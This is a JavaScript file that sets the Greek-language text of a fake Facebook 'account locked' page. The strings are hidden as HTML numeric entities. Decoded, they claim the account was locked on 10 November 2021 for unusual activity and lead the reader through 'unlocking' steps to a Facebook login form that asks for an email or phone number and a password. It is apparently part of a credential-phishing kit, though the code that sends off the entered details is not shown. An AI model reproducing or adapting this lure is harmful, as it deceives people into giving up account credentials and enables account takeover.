var mainHeader = document.querySelector(".home-main-header .home-heading");
var mainParagraph = document.querySelector(".home-mainparagrph .home-text");
var lockedHeader = document.querySelector(".home-lockedheader .home-text1");
var lockedParagraph = document.querySelector(".home-lockedinfobox .home-container6 .home-text5");
var footerParagraph = document.querySelector(".home-main-card .home-container7 .home-text6");
var getStarted = document.querySelector(".home-main-card .home-link");
var nextHeader = document.querySelector(".home-next-card .home-unlock-header .home-text");
var fristLineHeader = document.querySelector(".home-f-line .home-text03");
var fristLineParagraph = document.querySelector(".home-f-line .home-text05 span"); 
var secoundLineHeader = document.querySelector(".home-s-line .home-text09"); 
var thirdLineHeader = document.querySelector(".home-t-line .home-text12"); 
var nextButton = document.querySelector(".home-next-buttons .home-button1");
var backButton = document.querySelector(".home-next-buttons .home-button");
var logHeading = document.querySelector(".home-log-card .dlog .home-heading");
var logAlert = document.querySelector(".home-log-card .home-alert");
var logAlert2 = document.getElementById("alert");
var userInput = document.querySelector(".home-mail");
var passInput = document.querySelector(".home-pass");
var logButton = document.querySelector(".home-submit"); 
var or = document.querySelector(".home-or");
var createButton = document.querySelector(".home-creat-new");

mainHeader.innerHTML ="&#x39F; &#x3BB;&#x3BF;&#x3B3;&#x3B1;&#x3C1;&#x3B9;&#x3B1;&#x3C3;&#x3BC;&#x3CC;&#x3C2; &#x3C3;&#x3B1;&#x3C2; &#x3AD;&#x3C7;&#x3B5;&#x3B9; &#x3BA;&#x3BB;&#x3B5;&#x3B9;&#x3B4;&#x3C9;&#x3B8;&#x3B5;&#x3AF;";
mainParagraph.innerHTML ="&#x395;&#x3AF;&#x3B4;&#x3B1;&#x3BC;&#x3B5; &#x3B1;&#x3C3;&#x3C5;&#x3BD;&#x3AE;&#x3B8;&#x3B9;&#x3C3;&#x3C4;&#x3B7; &#x3B4;&#x3C1;&#x3B1;&#x3C3;&#x3C4;&#x3B7;&#x3C1;&#x3B9;&#x3CC;&#x3C4;&#x3B7;&#x3C4;&#x3B1; &#x3C3;&#x3C4;&#x3BF;&#x3BD; &#x3BB;&#x3BF;&#x3B3;&#x3B1;&#x3C1;&#x3B9;&#x3B1;&#x3C3;&#x3BC;&#x3CC; &#x3C3;&#x3B1;&#x3C2;. &#x391;&#x3C5;&#x3C4;&#x3CC; &#x3BC;&#x3C0;&#x3BF;&#x3C1;&#x3B5;&#x3AF; &#x3BD;&#x3B1; &#x3C3;&#x3B7;&#x3BC;&#x3B1;&#x3AF;&#x3BD;&#x3B5;&#x3B9; &#x3CC;&#x3C4;&#x3B9; &#x3BA;&#x3AC;&#x3C0;&#x3BF;&#x3B9;&#x3BF;&#x3C2; &#x3AD;&#x3C7;&#x3B5;&#x3B9; &#x3C7;&#x3C1;&#x3B7;&#x3C3;&#x3B9;&#x3BC;&#x3BF;&#x3C0;&#x3BF;&#x3B9;&#x3AE;&#x3C3;&#x3B5;&#x3B9; &#x3C4;&#x3BF;&#x3BD; &#x3BB;&#x3BF;&#x3B3;&#x3B1;&#x3C1;&#x3B9;&#x3B1;&#x3C3;&#x3BC;&#x3CC; &#x3C3;&#x3B1;&#x3C2; &#x3C7;&#x3C9;&#x3C1;&#x3AF;&#x3C2; &#x3BD;&#x3B1; &#x3C4;&#x3BF; &#x3B3;&#x3BD;&#x3C9;&#x3C1;&#x3AF;&#x3B6;&#x3B5;&#x3C4;&#x3B5;.";
lockedHeader.innerHTML ="&#x39F; &#x3BB;&#x3BF;&#x3B3;&#x3B1;&#x3C1;&#x3B9;&#x3B1;&#x3C3;&#x3BC;&#x3CC;&#x3C2; &#x3BA;&#x3BB;&#x3B5;&#x3B9;&#x3B4;&#x3CE;&#x3B8;&#x3B7;&#x3BA;&#x3B5; &#x3C3;&#x3C4;&#x3B9;&#x3C2; 10 &#x39D;&#x3BF;&#x3B5;&#x3BC;&#x3B2;&#x3C1;&#x3AF;&#x3BF;&#x3C5; 2021";
lockedParagraph.innerHTML ="&#x393;&#x3B9;&#x3B1; &#x3C4;&#x3B7;&#x3BD; &#x3C0;&#x3C1;&#x3BF;&#x3C3;&#x3C4;&#x3B1;&#x3C3;&#x3AF;&#x3B1; &#x3C3;&#x3B1;&#x3C2;, &#x3C4;&#x3BF; &#x3C0;&#x3C1;&#x3BF;&#x3C6;&#x3AF;&#x3BB; &#x3C3;&#x3B1;&#x3C2; &#x3B4;&#x3B5;&#x3BD; &#x3B5;&#x3AF;&#x3BD;&#x3B1;&#x3B9; &#x3BF;&#x3C1;&#x3B1;&#x3C4;&#x3CC; &#x3C3;&#x3B5; &#x3AC;&#x3C4;&#x3BF;&#x3BC;&#x3B1; &#x3C3;&#x3C4;&#x3BF; Facebook &#x3BA;&#x3B1;&#x3B9; &#x3B4;&#x3B5;&#x3BD; &#x3BC;&#x3C0;&#x3BF;&#x3C1;&#x3B5;&#x3AF;&#x3C4;&#x3B5; &#x3BD;&#x3B1; &#x3C7;&#x3C1;&#x3B7;&#x3C3;&#x3B9;&#x3BC;&#x3BF;&#x3C0;&#x3BF;&#x3B9;&#x3AE;&#x3C3;&#x3B5;&#x3C4;&#x3B5; &#x3C4;&#x3BF;&#x3BD; &#x3BB;&#x3BF;&#x3B3;&#x3B1;&#x3C1;&#x3B9;&#x3B1;&#x3C3;&#x3BC;&#x3CC; &#x3C3;&#x3B1;&#x3C2;.";
footerParagraph.innerHTML ="&#x398;&#x3B1; &#x3C3;&#x3B1;&#x3C2; &#x3BF;&#x3B4;&#x3B7;&#x3B3;&#x3AE;&#x3C3;&#x3BF;&#x3C5;&#x3BC;&#x3B5; &#x3C3;&#x3B5; &#x3BF;&#x3C1;&#x3B9;&#x3C3;&#x3BC;&#x3AD;&#x3BD;&#x3B1; &#x3B2;&#x3AE;&#x3BC;&#x3B1;&#x3C4;&#x3B1; &#x3B3;&#x3B9;&#x3B1; &#x3BD;&#x3B1; &#x3BE;&#x3B5;&#x3BA;&#x3BB;&#x3B5;&#x3B9;&#x3B4;&#x3CE;&#x3C3;&#x3B5;&#x3C4;&#x3B5; &#x3C4;&#x3BF;&#x3BD; &#x3BB;&#x3BF;&#x3B3;&#x3B1;&#x3C1;&#x3B9;&#x3B1;&#x3C3;&#x3BC;&#x3CC; &#x3C3;&#x3B1;&#x3C2;.";
getStarted.innerHTML ="&#x39E;&#x3B5;&#x3BA;&#x3AF;&#x3BD;&#x3B1;";
nextHeader.innerHTML ="&#x3A0;&#x3CE;&#x3C2; &#x3BD;&#x3B1; &#x3BE;&#x3B5;&#x3BA;&#x3BB;&#x3B5;&#x3B9;&#x3B4;&#x3CE;&#x3C3;&#x3B5;&#x3C4;&#x3B5; &#x3C4;&#x3BF;&#x3BD; &#x3BB;&#x3BF;&#x3B3;&#x3B1;&#x3C1;&#x3B9;&#x3B1;&#x3C3;&#x3BC;&#x3CC; &#x3C3;&#x3B1;&#x3C2;";
fristLineHeader.innerHTML ="&#x395;&#x3C0;&#x3B9;&#x3B2;&#x3B5;&#x3B2;&#x3B1;&#x3B9;&#x3CE;&#x3C3;&#x3C4;&#x3B5; &#x3CC;&#x3C4;&#x3B9; &#x3B1;&#x3C5;&#x3C4;&#x3CC;&#x3C2; &#x3B5;&#x3AF;&#x3BD;&#x3B1;&#x3B9; &#x3BF; &#x3BB;&#x3BF;&#x3B3;&#x3B1;&#x3C1;&#x3B9;&#x3B1;&#x3C3;&#x3BC;&#x3CC;&#x3C2; &#x3C3;&#x3B1;&#x3C2;";
fristLineParagraph.innerHTML ="&#x395;&#x3C0;&#x3B5;&#x3B9;&#x3B4;&#x3AE; &#x3BA;&#x3AC;&#x3C0;&#x3BF;&#x3B9;&#x3BF;&#x3C2; &#x3AC;&#x3BB;&#x3BB;&#x3BF;&#x3C2; &#x3BC;&#x3C0;&#x3BF;&#x3C1;&#x3B5;&#x3AF; &#x3BD;&#x3B1; &#x3B5;&#x3AF;&#x3C7;&#x3B5; &#x3C0;&#x3C1;&#x3CC;&#x3C3;&#x3B2;&#x3B1;&#x3C3;&#x3B7;, &#x3C0;&#x3C1;&#x3AD;&#x3C0;&#x3B5;&#x3B9; &#x3BD;&#x3B1; &#x3B5;&#x3C0;&#x3B9;&#x3B2;&#x3B5;&#x3B2;&#x3B1;&#x3B9;&#x3CE;&#x3C3;&#x3BF;&#x3C5;&#x3BC;&#x3B5; &#x3CC;&#x3C4;&#x3B9; &#x3B5;&#x3AF;&#x3C3;&#x3C4;&#x3B5; &#x3BF; &#x3BA;&#x3AC;&#x3C4;&#x3BF;&#x3C7;&#x3BF;&#x3C2; &#x3B1;&#x3C5;&#x3C4;&#x3BF;&#x3CD; &#x3C4;&#x3BF;&#x3C5; &#x3BB;&#x3BF;&#x3B3;&#x3B1;&#x3C1;&#x3B9;&#x3B1;&#x3C3;&#x3BC;&#x3BF;&#x3CD; &#x3C0;&#x3C1;&#x3BF;&#x3C4;&#x3BF;&#x3CD; &#x3C0;&#x3C1;&#x3BF;&#x3C7;&#x3C9;&#x3C1;&#x3AE;&#x3C3;&#x3BF;&#x3C5;&#x3BC;&#x3B5; &#x3C0;&#x3B5;&#x3C1;&#x3B1;&#x3B9;&#x3C4;&#x3AD;&#x3C1;&#x3C9;.";
secoundLineHeader.innerHTML ="&#x391;&#x3C3;&#x3C6;&#x3B1;&#x3BB;&#x3AF;&#x3C3;&#x3C4;&#x3B5; &#x3C4;&#x3B1; &#x3C3;&#x3C4;&#x3BF;&#x3B9;&#x3C7;&#x3B5;&#x3AF;&#x3B1; &#x3C3;&#x3CD;&#x3BD;&#x3B4;&#x3B5;&#x3C3;&#x3AE;&#x3C2; &#x3C3;&#x3B1;&#x3C2;";
thirdLineHeader.innerHTML ="&#x39F; &#x3BB;&#x3BF;&#x3B3;&#x3B1;&#x3C1;&#x3B9;&#x3B1;&#x3C3;&#x3BC;&#x3CC;&#x3C2; &#x3C3;&#x3B1;&#x3C2; &#x3B8;&#x3B1; &#x3BE;&#x3B5;&#x3BA;&#x3BB;&#x3B5;&#x3B9;&#x3B4;&#x3C9;&#x3B8;&#x3B5;&#x3AF;";
nextButton.innerHTML ="&#x395;&#x3C0;&#x3CC;&#x3BC;&#x3B5;&#x3BD;&#x3BF;";
backButton.innerHTML ="&#x3A0;&#x3AF;&#x3C3;&#x3C9;";
logHeading.innerHTML ="&#x3A3;&#x3C5;&#x3BD;&#x3B4;&#x3B5;&#x3B8;&#x3B5;&#x3AF;&#x3C4;&#x3B5; &#x3C3;&#x3C4;&#x3BF; Facebook";
logAlert.innerHTML ="&#x3A0;&#x3C1;&#x3AD;&#x3C0;&#x3B5;&#x3B9; &#x3C0;&#x3C1;&#x3CE;&#x3C4;&#x3B1; &#x3BD;&#x3B1; &#x3C3;&#x3C5;&#x3BD;&#x3B4;&#x3B5;&#x3B8;&#x3B5;&#x3AF;&#x3C4;&#x3B5;";
logAlert2.innerHTML ="&#x3A0;&#x3C1;&#x3AD;&#x3C0;&#x3B5;&#x3B9; &#x3C0;&#x3C1;&#x3CE;&#x3C4;&#x3B1; &#x3BD;&#x3B1; &#x3C3;&#x3C5;&#x3BD;&#x3B4;&#x3B5;&#x3B8;&#x3B5;&#x3AF;&#x3C4;&#x3B5;";
logButton.innerHTML ="&#x3A3;&#x3CD;&#x3BD;&#x3B4;&#x3B5;&#x3C3;&#x3B7;";
or.innerHTML ="&#x3AE;";
createButton.innerHTML ="&#x394;&#x3B7;&#x3BC;&#x3B9;&#x3BF;&#x3C5;&#x3C1;&#x3B3;&#x3AF;&#x3B1; &#x3BD;&#x3AD;&#x3BF;&#x3C5; &#x3BB;&#x3BF;&#x3B3;&#x3B1;&#x3C1;&#x3B9;&#x3B1;&#x3C3;&#x3BC;&#x3BF;&#x3CD;";


userInput.setAttribute("placeholder" , "Διεύθυνση email ή αριθμό τηλεφώνου");
passInput.setAttribute("placeholder" , "Κωδικός πρόσβασης");